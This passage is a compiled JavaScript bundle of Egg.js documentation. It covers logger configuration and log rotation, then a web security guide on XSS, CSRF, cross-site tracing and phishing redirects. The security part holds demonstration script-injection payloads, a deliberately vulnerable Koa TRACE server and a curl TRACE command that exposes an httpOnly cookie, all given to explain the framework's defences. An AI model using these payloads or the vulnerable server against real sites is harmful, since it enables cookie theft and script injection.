  level: 'DEBUG', // logs in all level will be written into files
};
`,paraId:30,tocIndex:9},{value:"Stop writing logs in all levels:",paraId:31,tocIndex:9},{value:`// config/config.\${env}.js
exports.logger = {
  level: 'NONE',
};
`,paraId:32,tocIndex:9},{value:"To avoid some plugin's DEBUG logs printing in the production environment causing performance problems, the production environment prohibits printing DEBUG-level logs by default. If there is a need to print DEBUG logs for debugging in the production environment, you need to set ",paraId:33,tocIndex:10},{value:"allowDebugAtProd",paraId:33,tocIndex:10},{value:" configuration to ",paraId:33,tocIndex:10},{value:"true",paraId:33,tocIndex:10},{value:".",paraId:33,tocIndex:10},{value:`// config/config.prod.js
exports.logger = {
  level: 'DEBUG',
  allowDebugAtProd: true,
};
`,paraId:34,tocIndex:10},{value:"By default, Egg will only print out ",paraId:35,tocIndex:11},{value:"INFO",paraId:35,tocIndex:11},{value:", ",paraId:35,tocIndex:11},{value:"WARN",paraId:35,tocIndex:11},{value:" and ",paraId:35,tocIndex:11},{value:"ERROR",paraId:35,tocIndex:11},{value:" in terminal. (Notice: It only works on ",paraId:35,tocIndex:11},{value:"local",paraId:35,tocIndex:11},{value:" and ",paraId:35,tocIndex:11},{value:"unittest",paraId:35,tocIndex:11},{value:" env)",paraId:35,tocIndex:11},{value:"logger.consoleLevel",paraId:36,tocIndex:11},{value:": The logger level in terminal. It defaults to ",paraId:36,tocIndex:11},{value:"INFO",paraId:36,tocIndex:11},{value:", though it defaults to ",paraId:36,tocIndex:11},{value:"WARN",paraId:36,tocIndex:11},{value:" on both ",paraId:36,tocIndex:11},{value:"local",paraId:36,tocIndex:11},{value:" and ",paraId:36,tocIndex:11},{value:"unittest",paraId:36,tocIndex:11},{value:" environments.",paraId:36,tocIndex:11},{value:"Similarly, it can be changed in the following ways:",paraId:37,tocIndex:11},{value:"Print logs in all levels:",paraId:38,tocIndex:11},{value:`// config/config.\${env}.js
exports.logger = {
  consoleLevel: 'DEBUG',
};
`,paraId:39,tocIndex:11},{value:"Stop printing logs in all levels:",paraId:40,tocIndex:11},{value:`// config/config.\${env}.js
exports.logger = {
  consoleLevel: 'NONE',
};
`,paraId:41,tocIndex:11},{value:"Base on performance considerations, console logger will be disabled after app ready at prod mode. however, you can enable it by config. (",paraId:42,tocIndex:11},{value:"Not Recommended",paraId:42,tocIndex:11},{value:")",paraId:42,tocIndex:11},{value:`// config/config.\${env}.js
exports.logger = {
  disableConsoleAfterReady: false,
};
`,paraId:43,tocIndex:11},{value:"For common scenarios, ",paraId:44,tocIndex:13},{value:"it's unnecessary to create new logger",paraId:44,tocIndex:13},{value:", because too many loggers will make them hard to be managed for later debugging.",paraId:44,tocIndex:13},{value:"The logger you create can be declared in config:",paraId:45,tocIndex:13},{value:`// config/config.\${env}.js
const path = require('path');

module.exports = (appInfo) => {
  return {
    customLogger: {
      xxLogger: {
        file: path.join(appInfo.root, 'logs/xx.log'),
      },
    },
  };
};
`,paraId:46,tocIndex:13},{value:"Now, you can get loggers via ",paraId:47,tocIndex:13},{value:"app.getLogger('xxLogger')",paraId:47,tocIndex:13},{value:" or ",paraId:47,tocIndex:13},{value:"ctx.getLogger('xxLogger')",paraId:47,tocIndex:13},{value:", and the logs printed from those loggers are similar to the ones from ",paraId:47,tocIndex:13},{value:"coreLogger",paraId:47,tocIndex:13},{value:".",paraId:47,tocIndex:13},{value:`// config/config.\${env}.js
const path = require('path');

module.exports = (appInfo) => {
  return {
    customLogger: {
      xxLogger: {
        file: path.join(appInfo.root, 'logs/xx.log'),
        formatter(meta) {
          return \`[\${meta.date}] \${meta.message}\`;
        },
        // ctx logger
        contextFormatter(meta) {
          return \`[\${meta.date}] [\${meta.ctx.method} \${meta.ctx.url}] \${meta.message}\`;
        },
      },
    },
  };
};
`,paraId:48,tocIndex:14},{value:"Logs will be written into files by default. Further, they will also be printed into terminal in development. But what if we need to print those into another place? Creating customized transport can take you there.",paraId:49,tocIndex:15},{value:"Transport can be considered as a tunnel to transfer data in Egg. A logger contains multiple transports, for example the one by default contains ",paraId:50,tocIndex:15},{value:"fileTransport",paraId:50,tocIndex:15},{value:" and ",paraId:50,tocIndex:15},{value:"consoleTransport",paraId:50,tocIndex:15},{value:".",paraId:50,tocIndex:15},{value:"For concrete scenario, we take ",paraId:51,tocIndex:15},{value:"common-error.log",paraId:51,tocIndex:15},{value:" as an example, which not only printed into files, but also sent to another remote service. At first, we can create a new transport for sending logs to remote:",paraId:51,tocIndex:15},{value:`const co = require('co');
const util = require('util');
const Transport = require('egg-logger').Transport;

class RemoteErrorTransport extends Transport {
  // Create log() to upload logs
  log(level, args) {
    let log;
    if (args[0] instanceof Error) {
      const err = args[0];
      log = util.format(
        '%s: %s\\n%s\\npid: %s\\n',
        err.name,
        err.message,
        err.stack,
        process.pid,
      );
    } else {
      log = util.format(...args);
    }

    this.options.app
      .curl('http://url/to/remote/error/log/service/logs', {
        data: log,
        method: 'POST',
      })
      .catch(console.error);
  }
}

// Transport attached to errorLogger in app.js, makes logs sync to it once those are created.
app
  .getLogger('errorLogger')
  .set('remote', new RemoteErrorTransport({ level: 'ERROR', app }));
`,paraId:52,tocIndex:15},{value:"Performance is what we always consider as important part in our services so that logs will firstly be written into memory and transferred to remote later.",paraId:53,tocIndex:15},{value:"One common requirement you can find in enterprise logs is automatic log sharding, which offers a convenient way for management. Luckily, Egg takes ",paraId:54,tocIndex:16},{value:"egg-logrotator",paraId:54,tocIndex:16},{value:" as built-in solution to meet the need.",paraId:54,tocIndex:16},{value:"This is the default way in Egg to cut the logs into files named by ",paraId:55,tocIndex:17},{value:".log.YYYY-MM-DD",paraId:55,tocIndex:17},{value:" at every ",paraId:55,tocIndex:17},{value:"00:00",paraId:55,tocIndex:17},{value:". For example, ",paraId:55,tocIndex:17},{value:"example-app-web.log",paraId:55,tocIndex:17},{value:" will be cut into files as follow, ",paraId:55,tocIndex:17},{value:"example-app-web.log.YYYY-MM-DD",paraId:55,tocIndex:17},{value:".",paraId:55,tocIndex:17},{value:"The log file also can be cut into ones by size. For example, Egg will process ",paraId:56,tocIndex:18},{value:"egg-web.log",paraId:56,tocIndex:18},{value:" when its size reach 2G:",paraId:56,tocIndex:18},{value:`// config/config.\${env}.js
const path = require('path');

module.exports = (appInfo) => {
  return {
    logrotator: {
      filesRotateBySize: [
        path.join(appInfo.root, 'logs', appInfo.name, 'egg-web.log'),
      ],
      maxFileSize: 2 * 1024 * 1024 * 1024,
    },
  };
};
`,paraId:57,tocIndex:18},{value:"Logs written into ",paraId:58,tocIndex:18},{value:"filesRotateBySize",paraId:58,tocIndex:18},{value:" file will never be processed again by date.",paraId:58,tocIndex:18},{value:"There is another option that the log files can be divided into small ones by hour.",paraId:59,tocIndex:19},{value:"For example, we need to cut ",paraId:60,tocIndex:19},{value:"common-error.log",paraId:60,tocIndex:19},{value:" by hour just like following implementation.",paraId:60,tocIndex:19},{value:`// config/config.\${env}.js
const path = require('path');

module.exports = (appInfo) => {
  return {
    logrotator: {
      filesRotateByHour: [
        path.join(appInfo.root, 'logs', appInfo.name, 'common-error.log'),
      ],
    },
  };
};
`,paraId:61,tocIndex:19},{value:"Logs written into ",paraId:62,tocIndex:19},{value:"filesRotateByHour",paraId:62,tocIndex:19},{value:" file will never be processed again by date.",paraId:62,tocIndex:19},{value:"Generally, requests are frequent events to Web services, so writing logs into disk after each event will cause more unexpected I/O. Egg takes following strategy to write logs:",paraId:63,tocIndex:20},{value:"Logs will be firstly transferred into memory, and then Egg will asynchronously write them into files by second.",paraId:64,tocIndex:20},{value:"More about ",paraId:65,tocIndex:20},{value:"egg-logger",paraId:65,tocIndex:20},{value:" and ",paraId:65,tocIndex:20},{value:"egg-logrotator",paraId:65,tocIndex:20},{value:"\u3002",paraId:65,tocIndex:20}]},17628:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(30717);const t=[{value:"There are a lot of security risks in Web applications, the risk will be used by hackers, while distort Web page content, or steal website internal data, further more, malicious code maybe embedded in the Web page, make users be weak. Common security vulnerabilities are as follows:",paraId:0,tocIndex:0},{value:"XSS attack: inject scripts into Web pages, use JavaScript to steal user information, then induce user actions.",paraId:1,tocIndex:0},{value:"CSRF attack: forgery user requests to launch malicious requests to the site.",paraId:1,tocIndex:0},{value:"phishing attacks: use the site's links or images to create phishing traps.",paraId:1,tocIndex:0},{value:"http parameter pollution: by using imperfect validation of parameter format, the server will be injected with parameters.",paraId:1,tocIndex:0},{value:"remote code execution: users could implement command through browser, due to the server did not perform function against doing filtering, lead to malicious code execution.",paraId:1,tocIndex:0},{value:"The framework itself has a rich solution for common security risks on the Web side:",paraId:2,tocIndex:0},{value:"use ",paraId:3,tocIndex:0},{value:"extend",paraId:3,tocIndex:0},{value:" mechanism to extend Helper API, various template filtering functions are provided to prevent phishing or XSS attacks.",paraId:3,tocIndex:0},{value:"Support of common Web security headers.",paraId:3,tocIndex:0},{value:"CSRF defense.",paraId:3,tocIndex:0},{value:"flexible security configuration that matches different request urls.",paraId:3,tocIndex:0},{value:"customizable white list for safe redirect and url filtering.",paraId:3,tocIndex:0},{value:"all kinds of template related tools for preprocessing.",paraId:3,tocIndex:0},{value:"Security plugins ",paraId:4,tocIndex:0},{value:"egg-security",paraId:4,tocIndex:0},{value:" are built into the framework, provides default security practices.",paraId:4,tocIndex:0},{value:"Note: it is not recommended to turn off the functions provided by the security plugins unless the consequences are clearly confirmed.",paraId:5,tocIndex:1},{value:"The security plugin for the framework opens by default, if we want to close some security protection, directly set the ",paraId:6,tocIndex:1},{value:"enable",paraId:6,tocIndex:1},{value:" attribute to false. For example, close xframe precautions:",paraId:6,tocIndex:1},{value:`exports.security = {
  xframe: {
    enable: false,
  },
};
`,paraId:7,tocIndex:1},{value:"match",paraId:8},{value:"ignore",paraId:8},{value:"Match and ignore methods and formats are the same with",paraId:9,tocIndex:2},{value:"middleware general configuration",paraId:10,tocIndex:2},{value:".",paraId:9,tocIndex:2},{value:"If you want to set security config open for a certain path, you can configure ",paraId:11,tocIndex:2},{value:"match",paraId:11,tocIndex:2},{value:" option.",paraId:11,tocIndex:2},{value:"For example, just open csp when path contains ",paraId:12,tocIndex:2},{value:"/example",paraId:12,tocIndex:2},{value:", you can configure with the following configuration:",paraId:12,tocIndex:2},{value:`exports.security = {
  csp: {
    match: '/example',
    policy: {
      //...
    },
  },
};
`,paraId:13,tocIndex:2},{value:"If you want to set security config disable for a certain path, you can configure match option.",paraId:14,tocIndex:2},{value:"For example, just disable xframe when path contains ",paraId:15,tocIndex:2},{value:"/example",paraId:15,tocIndex:2},{value:" while our pages can be embedded in cooperative businesses , you can configure with the following configuration:",paraId:15,tocIndex:2},{value:`exports.security = {
  csp: {
    ignore: '/example',
    xframe: {
      //...
    },
  },
};
`,paraId:16,tocIndex:2},{value:"If you want to close some security protection against internal IP:",paraId:17,tocIndex:2},{value:`exports.security = {
  csrf: {
    // To determine whether to ignore the method, request context "context" as the first parameter
    ignore: (ctx) => isInnerIp(ctx.ip),
  },
};
`,paraId:18,tocIndex:2},{value:"We'll look at specific scenarios to illustrate how to use the security scenarios provided by the framework for Web security precautions.",paraId:19,tocIndex:2},{value:"XSS",paraId:8},{value:"XSS",paraId:20,tocIndex:3},{value:'\uFF08cross-site scripting\uFF09is the most common Web attack, which focus on "cross-domain" and "client-side execution."',paraId:20,tocIndex:3},{value:"XSS attacks generally fall into two categories:",paraId:21,tocIndex:3},{value:"Reflected XSS",paraId:22,tocIndex:3},{value:"Stored XSS",paraId:22,tocIndex:3},{value:"Reflective XSS attacks, mainly because the server receives insecure input from the client, triggers the execution of a Web attack on the client side. Such as:",paraId:23,tocIndex:4},{value:"Search for items on a shopping site, and results will display search keywords. Now you fill in the search keywords ",paraId:24,tocIndex:4},{value:"<script>alert('handsome boy')<\/script>",paraId:24,tocIndex:4},{value:", then click search. If page does not filter the keywords, this code will be executed directly on the page, pop-up alert.",paraId:24,tocIndex:4},{value:"Framework provides ",paraId:25,tocIndex:5},{value:"helper.escape()",paraId:25,tocIndex:5},{value:" method to do string XSS filter.",paraId:25,tocIndex:5},{value:`const str = '><script>alert("abc") <\/script><';
console.log(ctx.helper.escape(str));
// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;
`,paraId:26,tocIndex:5},{value:"When the site need to output the result of user input directly, be sure to use ",paraId:27,tocIndex:5},{value:"helper.escape()",paraId:27,tocIndex:5},{value:" wrapped. Such as in ",paraId:27,tocIndex:5},{value:"egg-view-nunjucks",paraId:27,tocIndex:5},{value:" will overwrite the built-in ",paraId:27,tocIndex:5},{value:"escape",paraId:27,tocIndex:5},{value:"In another case, the output of server's interface will be provided to JavaScript to use. This time you need to use ",paraId:28,tocIndex:5},{value:"helper.sjs()",paraId:28,tocIndex:5},{value:" for filtering.",paraId:28,tocIndex:5},{value:"helper.sjs()",paraId:29,tocIndex:5},{value:` is used to output variables in JavaScript (including events such as onload), and do JavaScript ENCODE for characters in variables.
All characters will be escaped to `,paraId:29,tocIndex:5},{value:"\\x",paraId:29,tocIndex:5},{value:" if there are not in whitelist, to prevent XSS attacks, also ensure the correctness of the output in JavaScript.",paraId:29,tocIndex:5},{value:`const foo = '"hello"';

// not use sjs
console.log(\`var foo = "\${foo}";\`);
// => var foo = ""hello"";

// use sjs
console.log(\`var foo = "\${this.helper.sjs(foo)}";\`);
// => var foo = "\\\\x22hello\\\\x22";
`,paraId:30,tocIndex:5},{value:"There is also a case that sometimes we need to output json in JavaScript, which is easily exploited as a XSS vulnerability if it is not escaped. Framework provides ",paraId:31,tocIndex:5},{value:"helper.sjson()",paraId:31,tocIndex:5},{value:" macro to do json encode, it will traverse the key in a json, all the character in the key's value will be escaped to ",paraId:31,tocIndex:5},{value:"\\x",paraId:31,tocIndex:5},{value:` if there are not in whitelist, to prevent XSS attacks, while keep the json structure unchanged.
If you need to output a JSON string for use in JavaScript, please use `,paraId:31,tocIndex:5},{value:"helper.sjson(variable name)",paraId:31,tocIndex:5},{value:" to escape.",paraId:31,tocIndex:5},{value:"The processing process is more complicated, the performance loss is larger, please use only if necessary",paraId:32,tocIndex:5},{value:"Example:",paraId:33,tocIndex:5},{value:`<script>
  window.locals = {{ helper.sjson(locals) }};
<\/script>
`,paraId:34,tocIndex:5},{value:"Stored XSS attacks are stored on the server by submitting content with malicious scripts that will be launched when others see the content. The content is typically edited through some rich text editors, and it is easy to insert dangerous code.",paraId:35,tocIndex:6},{value:"Framework provides ",paraId:36,tocIndex:7},{value:"helper.shtml()",paraId:36,tocIndex:7},{value:" to do XSS filtering.",paraId:36,tocIndex:7},{value:`Note that you need to use SHTML to handle the rich text (which contains the text of the HTML code) as a variable directly in the template.
Use SHTML to output HTML tags, while executing XSS filtering, then it can filter out illegal scripts.`,paraId:37,tocIndex:7},{value:"The processing process is more complicated, the performance loss is larger, please use only if you need to output html content",paraId:38,tocIndex:7},{value:"Example\uFF1A",paraId:39,tocIndex:7},{value:'// js\nconst value = `<a href="http://www.domain.com">google</a><script>evilcode\u2026<\/script>`;\n',paraId:40,tocIndex:7},{value:`// template
<html>
  <body>
    {{ helper.shtml(value) }}
  </body>
</html>
// =>
<a href="http://www.domain.com">google</a>&lt;script&gt;evilcode\u2026&lt;/script&gt;
`,paraId:41,tocIndex:7},{value:"Shtml based on ",paraId:42,tocIndex:7},{value:"xss",paraId:42,tocIndex:7},{value:" , and add filters by domain name.",paraId:42,tocIndex:7},{value:"defaule rule",paraId:43,tocIndex:7},{value:"custom rule",paraId:43,tocIndex:7},{value:"For example, only support ",paraId:44,tocIndex:7},{value:"a",paraId:44,tocIndex:7},{value:" label, and all other properties except ",paraId:44,tocIndex:7},{value:"title",paraId:44,tocIndex:7},{value:" are filtered: ",paraId:44,tocIndex:7},{value:"whiteList: {a: ['title']}",paraId:44,tocIndex:7},{value:"options:",paraId:45,tocIndex:7},{value:"config.helper.shtml.domainWhiteList: []",paraId:46,tocIndex:7},{value:' extend whilelist used by "href" and "src"',paraId:46,tocIndex:7},{value:"Note shtml uses a strict whitelisting mechanism, not only filter out the XSS risk strings, all tags or attrs outside [the default rules] (",paraId:47,tocIndex:7},{value:"https://github.com/leizongmin/js-xss/blob/master/lib/default.js",paraId:47,tocIndex:7},{value:") will be filtered out.",paraId:47,tocIndex:7},{value:"For example, tag ",paraId:48,tocIndex:7},{value:"HTML",paraId:48,tocIndex:7},{value:" is not in the whitelist.",paraId:48,tocIndex:7},{value:`const html = '<html></html>';

// html
{
  {
    helper.shtml(html);
  }
}
// empty output
`,paraId:49,tocIndex:7},{value:"Due to not in the whitelist, common properties like ",paraId:50,tocIndex:7},{value:"data-xx",paraId:50,tocIndex:7},{value:" will be filtered.",paraId:50,tocIndex:7},{value:"So, it is important to pay attention to the use of shtml, which is generally aimed at the rich text input from users, please avoid abuse, which can be restricted and affect the performance of the service.",paraId:51,tocIndex:7},{value:"Such scenarios are generally like BBS, comment system, etc., even if does not support HTML content such as BBS input, do not use this Helper, direct use ",paraId:52,tocIndex:7},{value:"escape",paraId:52,tocIndex:7},{value:" instead.",paraId:52,tocIndex:7},{value:`JSONP's "callback" parameter is very dangerous, it has two kinds of risks that might lead to XSS`,paraId:53,tocIndex:8},{value:"Callback parameter will truncate js code, the special characters like single quotation, double quotation or line breaks, both are at risk.",paraId:54,tocIndex:8},{value:"2\u3001Callback parameter add tag maliciously(such as ",paraId:55,tocIndex:8},{value:"<script>",paraId:55,tocIndex:8},{value:"), cause XSS risk.",paraId:55,tocIndex:8},{value:"Refer to ",paraId:56,tocIndex:8},{value:"JSONP security technic",paraId:56,tocIndex:8},{value:"Within the framework, the ",paraId:57,tocIndex:8},{value:"jsonp-body",paraId:57,tocIndex:8},{value:" is used to make jsonp requests safe.",paraId:57,tocIndex:8},{value:"Defense content:",paraId:58,tocIndex:8},{value:"maximum 50 character limit for the name of callback function",paraId:59,tocIndex:8},{value:"callback function name only allow ",paraId:59,tocIndex:8},{value:"[",paraId:59,tocIndex:8},{value:", ",paraId:59,tocIndex:8},{value:"]",paraId:59,tocIndex:8},{value:", ",paraId:59,tocIndex:8},{value:"a-zA-Z0123456789_",paraId:59,tocIndex:8},{value:", ",paraId:59,tocIndex:8},{value:"$",paraId:59,tocIndex:8},{value:", ",paraId:59,tocIndex:8},{value:".",paraId:59,tocIndex:8},{value:" to prevent XSS or utf-7 XSS attacks, etc.",paraId:59,tocIndex:8},{value:"Configration:",paraId:60,tocIndex:8},{value:"callback - default is ",paraId:61,tocIndex:8},{value:"_callback",paraId:61,tocIndex:8},{value:", you can rename",paraId:61,tocIndex:8},{value:"limit - callback function name length limit, default is 50.",paraId:61,tocIndex:8},{value:"Browser itself has some protection against all kinds of attacks, they generally take effect by opening the Web security headers. The framework has built-in support for some common Web security headers.",paraId:62,tocIndex:9},{value:"CSP is short for Content Security Policy, It is mainly used to define which resources the page can load and reduce the occurrence of XSS.",paraId:63,tocIndex:10},{value:"The framework supports the CSP configuration, but is closed by default, which can effectively prevent XSS attacks from happening. To configure the CSP, you need to know the policy strategy of CSP first, the details you can refer to [what CSP] (",paraId:64,tocIndex:10},{value:"https://www.zhihu.com/question/21979782",paraId:64,tocIndex:10},{value:").",paraId:64,tocIndex:10},{value:'Opened by default, introduced in IE8 to control visibility of the "Open" button on the file download dialog.',paraId:65,tocIndex:11},{value:"Refer to ",paraId:66,tocIndex:11},{value:"http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx",paraId:66,tocIndex:11},{value:"Disable IE8 automatically sniffer such as ",paraId:67,tocIndex:12},{value:"text/plain",paraId:67,tocIndex:12},{value:" rendered by ",paraId:67,tocIndex:12},{value:"text/HTML",paraId:67,tocIndex:12},{value:" , especially when the content of this site is not credible.",paraId:67,tocIndex:12},{value:"Some XSS detection and precautions provided by Internet explorer, enabled by default",paraId:68,tocIndex:13},{value:"close default is false\uFF0Cequal to ",paraId:69,tocIndex:13},{value:"1; mode=block",paraId:69,tocIndex:13},{value:"CSRF",paraId:8},{value:"CSRF or XSRF",paraId:70,tocIndex:14},{value:" is short for Cross-site request forgery, also called ",paraId:70,tocIndex:14},{value:"One Click Attack",paraId:70,tocIndex:14},{value:" or ",paraId:70,tocIndex:14},{value:"Session Riding",paraId:70,tocIndex:14},{value:", is a malicious use of the site.",paraId:70,tocIndex:14},{value:"CSRF attack will launch a malicious fake request for the site, which seriously affects the security of the site. Therefore, the framework has a built-in CSRF preparedness plan.",paraId:71,tocIndex:14},{value:"In general, there are some common ",paraId:72,tocIndex:15},{value:"precautions",paraId:72,tocIndex:15},{value:" for CSRF attacks. Briefly introduce several common precautions:",paraId:72,tocIndex:15},{value:"Synchronizer Tokens\uFF1AWhen the response page is rendered, token is rendered in the page, which will be submitted through a hidden input when a form is submitted.",paraId:73,tocIndex:15},{value:"Double Cookie Defense\uFF1AThe token will be stored in client Cookie, Cookie will be submitted when you submit a POST/PUT/PATCH/DELETE request, then you can get the token, and submit the token through header or body, service side will compare and check it.",paraId:74,tocIndex:15},{value:"Custom Header\uFF1ATrust request with specific header\uFF08like ",paraId:75,tocIndex:15},{value:"X-Requested-With: XMLHttpRequest",paraId:75,tocIndex:15},{value:"\uFF09. This can be bypassed, so frameworks like rails and django ",paraId:75,tocIndex:15},{value:"give up the guard",paraId:75,tocIndex:15},{value:".",paraId:75,tocIndex:15},{value:"The framework combines these precautions to provide a configurable CSRF prevention strategy.",paraId:76,tocIndex:15},{value:"In synchronous rendering the page, you should add a parameter name called ",paraId:77,tocIndex:17},{value:"_csrf",paraId:77,tocIndex:17},{value:" in the form's submit url, the value is ",paraId:77,tocIndex:17},{value:"ctx.csrf",paraId:77,tocIndex:17},{value:", when user submitting this form , CSRF token will be submitted:",paraId:77,tocIndex:17},{value:`<form
  method="POST"
  action="/upload?_csrf={{ ctx.csrf | safe }}"
  enctype="multipart/form-data"
>
  title: <input name="title" /> file: <input name="file" type="file" />
  <button type="submit">upload</button>
</form>
`,paraId:78,tocIndex:17},{value:"Fields that pass the CSRF token can be changed in the configuration:",paraId:79,tocIndex:17},{value:`// config/config.default.js
module.exports = {
  security: {
    csrf: {
      queryName: '_csrf', // CSRF token parameter name passed through query, default is _csrf
      bodyName: '_csrf', // CSRF token parameter name passed through body, default is _csrf
    },
  },
};
`,paraId:80,tocIndex:17},{value:"In order to prevent the ",paraId:81,tocIndex:17},{value:"BREACH attack",paraId:81,tocIndex:17},{value:", CSRF token rendered on the page will be changed everytime request changed, and the view plugin, such as ",paraId:81,tocIndex:17},{value:"egg-view-nunjucks",paraId:81,tocIndex:17},{value:", will automatically inject the hidden field in Form without any perception of the application developer.",paraId:81,tocIndex:17},{value:"In the default configuration, the token is set in the Cookie, which can be fetched from the Cookie and sent to the server through query, body, or header when an AJAX request is requested.",paraId:82,tocIndex:18},{value:"In jQuery:",paraId:83,tocIndex:18},{value:`var csrftoken = Cookies.get('csrfToken');

function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return /^(GET|HEAD|OPTIONS|TRACE)$/.test(method);
}
$.ajaxSetup({
  beforeSend: function (xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('x-csrf-token', csrftoken);
    }
  },
});
`,paraId:84,tocIndex:18},{value:"The fields that pass the CSRF token through the header can also be changed in the configuration:",paraId:85,tocIndex:18},{value:`// config/config.default.js
module.exports = {
  security: {
    csrf: {
      headerName: 'x-csrf-token', // CSRF token passed through header, default is x-csrf-token
    },
  },
};
`,paraId:86,tocIndex:18},{value:"By default, the framework will present the CSRF token in a Cookie to facilitate AJAX requests. But all subdomains can set cookies, so when our application cannot controll all subdomains, there may be a risk of CSRF attack stored in the Cookie. The framework provides a configuration that token can be stored in the Session.",paraId:87,tocIndex:19},{value:`// config/config.default.js
module.exports = {
  security: {
    csrf: {
      useSession: true, // default is false\uFF0Cif set to true , it will store csrf token in Session
      cookieName: 'csrfToken', // Field in Cookie , default is csrfToken
      sessionName: 'csrfToken', // Filed in Session , default is csrfToken
    },
  },
};
`,paraId:88,tocIndex:19},{value:"Notice: this configure is deprecated, the attacker can bypass it through ",paraId:89,tocIndex:20},{value:"flash and 307",paraId:89,tocIndex:20},{value:", please don't enable it in production environment!",paraId:89,tocIndex:20},{value:"With security policy protection ",paraId:90,tocIndex:20},{value:"SOP",paraId:90,tocIndex:20},{value:", basically all modern browsers do not allow cross domain request when content-type is set to JSON, so we can just leave out JSON request.",paraId:90,tocIndex:20},{value:`// config/config.default.js
module.exports = {
  security: {
    csrf: {
      ignoreJSON: true, // default is false\uFF0Cif set to be true ,it will leave out all request which content-type is \`application/json\`
    },
  },
};
`,paraId:91,tocIndex:20},{value:"As CSRF token is stored in Cookie, once the user switches in the same browser, a new login user will still use the old token (old user used) before, this will bring certain security risks, so everytime user do login, website must refresh ",paraId:92,tocIndex:21},{value:"CSRF token",paraId:92,tocIndex:21},{value:".",paraId:92,tocIndex:21},{value:`// login controller
exports.login = async function (ctx) {
  const { username, password } = ctx.request.body;
  const user = await ctx.service.user.find({ username, password });
  if (!user) ctx.throw(403);
  ctx.session = { user };

  // call rotateCsrfSecret to refresh CSRF token
  ctx.rotateCsrfSecret();

  ctx.body = { success: true };
};
`,paraId:93,tocIndex:21},{value:"XST",paraId:8},{value:"XST",paraId:94,tocIndex:22},{value:" is short for ",paraId:94,tocIndex:22},{value:"Cross-Site Tracing",paraId:94,tocIndex:22},{value:", client send TRACE request to server, if the server implement TRACE responding by standard, the complete header information of the request will be returned in response body. This way, client can get some sensitive header fields, such as httpOnly cookies.",paraId:94,tocIndex:22},{value:"Below, we implement a simple TRACE support server based on Koa:",paraId:95,tocIndex:22},{value:`var koa = require('koa');
var app = koa();

app.use(async function (ctx, next) {
  ctx.cookies.set('a', 1, { httpOnly: true });
  if (ctx.method === 'TRACE') {
    var body = '';
    for (header in ctx.headers) {
      body += header + ': ' + ctx.headers[header] + '\\r\\n';
    }
    ctx.body = body;
  }
  await next;
});

app.listen(7001);
`,paraId:96,tocIndex:22},{value:"You can send a GET request first ",paraId:97,tocIndex:22},{value:"curl -i http://127.0.0.1:7001",paraId:97,tocIndex:22},{value:" when service started, you will get response below:",paraId:97,tocIndex:22},{value:`HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK
`,paraId:98,tocIndex:22},{value:"Then server sets an httpOnly Cookie ",paraId:99,tocIndex:22},{value:"a",paraId:99,tocIndex:22},{value:" to 1, it is not possible to get it through the script in the browser environment.",paraId:99,tocIndex:22},{value:"Then we send a TRACE method request to the server with Cookie ",paraId:100,tocIndex:22},{value:"curl -X TRACE -b a=1 -i http://127.0.0.1:7001",paraId:100,tocIndex:22},{value:", and will get response below:",paraId:100,tocIndex:22},{value:`  HTTP/1.1 200 OK
  X-Powered-By: koa
  Set-Cookie: a=1; path=/; httponly
  Content-Type: text/plain; charset=utf-8
  Content-Length: 73
  Date: Thu, 06 Nov 2014 05:07:47 GMT
  Connection: keep-alive

  user-agent: curl/7.37.1
  host: 127.0.0.1:7001
  accept: */*
  cookie: a=1
`,paraId:101,tocIndex:22},{value:"The complete header information can be seen in the response body, so that we bypass the httpOnly limit and get the cookie a= 1, causing a great risk.",paraId:102,tocIndex:22},{value:"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html",paraId:103,tocIndex:23},{value:"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/",paraId:104,tocIndex:23},{value:"The framework has banned three types of dangerous request type: trace, track, options.",paraId:105,tocIndex:24},{value:"phishing attacks",paraId:8},{value:"There are many ways to Phishing, here will introduce url Phishing, photo Phishing and iframe Phishing.",paraId:106,tocIndex:25},{value:"The server side does not check and control the incoming redirect url variable, which can lead to malicious construction of any malicious address, then can induce users to redirect to malicious websites.",paraId:107,tocIndex:26},{value:"Due to redirect from a trusted site, users will be more trust, so redirect risk is commonly used in phishing attacks, by going to a malicious web site and cheat users enter the user name and password to steal user information, make money trading or deceive users;",paraId:108,tocIndex:26},{value:"It may also cause XSS attact (mainly use 302 redirect often, set HTTP response headers: ",paraId:109,tocIndex:26},{value:"Location: url",paraId:109,tocIndex:26},{value:", if the url contains a CRLF, it could partition the HTTP response headers, make the back part falls to HTTP body, leading to XSS).",paraId:109,tocIndex:26},{value:"If the redirect url can be determined in advance, including the value of the url and parameters, you can configured in the background first. If do redirect, directly preach corresponding index of url, and find corresponding specific url then redirect through index;",paraId:110,tocIndex:27},{value:"If the redirect url is not previously determined, but it is generated by server background (not passing by user's parameter), you can make a redirect link, then sign it;",paraId:110,tocIndex:27},{value:"if 1 and 2 are not satisfied, url could not determine beforehand and only pass through the front end of the incoming parameters, url must be validated before redirect, to judge whether it within the application authorization whitelist.",paraId:110,tocIndex:27},{value:"The framework provides a safe redirect method to avoid this risk by configuring a whitelist.",paraId:111,tocIndex:27},{value:"ctx.redirect(url)",paraId:112,tocIndex:27},{value:" If redirect url is not in the whitelist of configuration, it is forbidden.",paraId:112,tocIndex:27},{value:"ctx.unsafeRedirect(url)",paraId:112,tocIndex:27},{value:" Allow all redirects, It is generally not recommended to use after a clear understanding of possible risks.",paraId:112,tocIndex:27},{value:"Safety plan covers the default ",paraId:113,tocIndex:27},{value:"ctx.redirect",paraId:113,tocIndex:27},{value:" method, all redirects will go through security domain.",paraId:113,tocIndex:27},{value:"You need to do the following configuration in the application configuration file if user use ",paraId:114,tocIndex:27},{value:"ctx.redirect",paraId:114,tocIndex:27},{value:" method:",paraId:114,tocIndex:27},{value:`// config/config.default.js
exports.security = {
  domainWhiteList: ['.domain.com'], // security domain while list, start with .
};
